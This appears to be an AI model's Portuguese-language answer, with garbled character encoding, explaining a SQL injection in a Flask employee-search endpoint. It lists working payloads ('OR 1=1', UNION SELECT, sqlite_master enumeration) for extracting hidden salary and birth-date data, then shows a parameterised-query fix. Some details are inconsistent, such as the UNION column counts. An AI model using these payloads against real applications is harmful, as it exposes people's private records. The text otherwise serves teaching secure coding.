O c√≥digo em **Flask + SQLAlchemy** que voc√™ mostrou **√© vulner√°vel a SQL Injection**, porque ele monta a query assim:

```python
results = conn.execute(
    "SELECT * FROM Employee WHERE name LIKE '%" + name + "%'"
).fetchall()
```

üìå O valor da vari√°vel `name` **vem diretamente do input do usu√°rio (`request.form`)** e **√© concatenado na query sem qualquer sanitiza√ß√£o**.

---

### üîì **Como explorar a vulnerabilidade para obter todos os dados**

Se voc√™ enviar no campo **search**:

```
' OR 1=1 --
```

A query final ficar√° assim:

```sql
SELECT * FROM Employee WHERE name LIKE '%' OR 1=1 --%'
```

‚û°Ô∏è O `OR 1=1` sempre √© verdadeiro, e `--` comenta o resto da query.
‚úÖ Isso **retornar√° todos os registros da tabela Employee**.

---

### üîì **Como listar colunas espec√≠ficas**

Como voc√™ j√° sabe o nome da tabela (`Employee`) e as colunas (`id, name, email, phone, dob, salary`), pode usar um **payload com UNION SELECT**, por exemplo:

```
' UNION SELECT id, name, email, phone, dob, salary FROM Employee --
```

Isso **for√ßar√° a query a retornar todos os dados**, independentemente do filtro original.

---

### üîì **Como descobrir informa√ß√µes adicionais (caso n√£o saiba os nomes)**

Voc√™ pode tentar **enumerar a estrutura do banco SQLite**, usando tabelas internas como `sqlite_master`.
Por exemplo:

```
' UNION SELECT 1, name, sql, 4, 5, 6 FROM sqlite_master WHERE type='table' --
```

‚û°Ô∏è Isso retorna os nomes e defini√ß√µes das tabelas do banco.

Depois, √© poss√≠vel **listar colunas** de uma tabela espec√≠fica:

```
' UNION SELECT 1, name, sql, 4, 5, 6 FROM sqlite_master WHERE type='table' AND name='Employee' --
```

O HTML s√≥ mostra **name, email e phone**, e oculta (`[redacted]`) o **dob** e **salary**.

Mas o banco cont√©m **todas as colunas**, e como a query no c√≥digo √©:

```python
results = conn.execute("SELECT * FROM Employee WHERE name LIKE '%" + name + "%'").fetchall()
```

üìå **Isso significa que a aplica√ß√£o realmente busca TODAS as colunas (`SELECT *`)**, mas o template HTML s√≥ exibe algumas.

---

### ‚úÖ **Como listar TODAS as colunas no HTML**

Basta alterar o template `employees.html` e adicionar as colunas ocultas:

```html
{% for emp in employees %}
  <tr>
    <td>{{ emp.id }}</td>
    <td>{{ emp.name }}</td>
    <td>{{ emp.email }}</td>
    <td>{{ emp.phone }}</td>
    <td>{{ emp.dob }}</td>    <!-- Antes estava [redacted] -->
    <td>{{ emp.salary }}</td> <!-- Antes estava [redacted] -->
  </tr>
{% endfor %}
```

---

### ‚úÖ **Como ver todas as colunas via SQL Injection (sem alterar o c√≥digo)**

Como a query concatena a entrada, basta enviar um payload que **n√£o dependa do LIKE**, por exemplo:

```
' OR 1=1 --
```

Isso retorna **todas as linhas** com **todas as colunas** (mesmo que o HTML n√£o exiba tudo, a resposta cont√©m tudo no objeto `employees`).

Se voc√™ quiser **for√ßar a aplica√ß√£o a retornar apenas algumas colunas espec√≠ficas**, pode usar:

```
' UNION SELECT id, name, salary, salary, salary, salary FROM Employee --
```

Mas cuidado: o n√∫mero de colunas do `UNION` deve ser igual ao n√∫mero de colunas esperadas no HTML.

Se o HTML espera **5 colunas**, voc√™ pode repetir algumas:

```
' UNION SELECT name, email, phone, dob, salary FROM Employee --
```


### ‚ö† **Por que isso acontece?**

* O c√≥digo **n√£o usa par√¢metros seguros** (`?` ou bind params).
* Como `conn.execute()` est√° recebendo **string concatenada**, qualquer valor passado vira parte da query.

---

### ‚úÖ **Como corrigir**

A forma correta seria usar par√¢metros:

```python
results = conn.execute(
    "SELECT * FROM Employee WHERE name LIKE ?",
    ('%' + name + '%',)
).fetchall()
```

Ou, ainda melhor, usar o **Query Builder do SQLAlchemy**:

```python
results = db.session.query(Employee).filter(Employee.name.like(f"%{name}%")).all()
```

---


